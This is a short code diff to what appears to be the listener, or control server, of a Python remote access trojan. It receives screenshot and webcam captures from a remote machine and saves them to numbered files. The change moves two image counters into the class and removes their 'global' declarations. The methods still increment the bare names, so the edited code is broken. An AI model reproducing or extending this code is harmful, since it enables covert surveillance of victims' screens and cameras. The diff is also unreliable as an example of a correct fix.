@@ -3,11 +3,10 @@ import termcolor
 import base64
 
 
-cam_count = 0 
-src_count = 0
-
-
 class Listener:
+	cam_count = 0 
+	src_count = 0
+	
 	def __init__(self, ip, port):
 		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -67,11 +66,9 @@ class Listener:
 					self.write_file(file_name, result)
 				elif command.split()[0] == "screenshot":
 					self.write_file(f"screen_{src_count}.png", result)
-					global src_count
 					src_count += 1
 				elif command.split()[0] == "camera":
 					self.write_file(f"camera_{cam_count}.jpg", result)
-					global cam_count
 					cam_count += 1
 				else:
 					if result != None:
